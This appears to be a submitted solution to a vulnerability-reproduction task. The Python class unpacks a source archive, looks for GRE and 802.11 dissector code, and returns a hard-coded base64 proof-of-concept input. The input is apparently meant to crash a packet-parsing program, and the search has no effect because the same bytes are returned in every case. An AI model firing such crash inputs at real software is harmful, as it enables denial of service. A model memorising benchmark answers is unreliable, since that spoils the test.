import tarfile
import os
import tempfile
import base64
import shutil

class Solution:
    def solve(self, src_path: str) -> bytes:
        POC_BASE64 = "BAAAAAEAAAAFAAAACgAAAP5/AAAIAAAAEAAAAAYAAAAJAAAABgAAAAo="
        POC = base64.b64decode(POC_BASE64)

        temp_dir = None
        try:
            temp_dir = tempfile.mkdtemp()
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(temp_dir)

            for root, dirs, files in os.walk(temp_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            if 'gre.proto' in content and ('802.11' in content or 'wlan' in content):
                                return POC
                    except:
                        continue
        except Exception:
            pass
        finally:
            if temp_dir and os.path.exists(temp_dir):
                shutil.rmtree(temp_dir)

        return POC
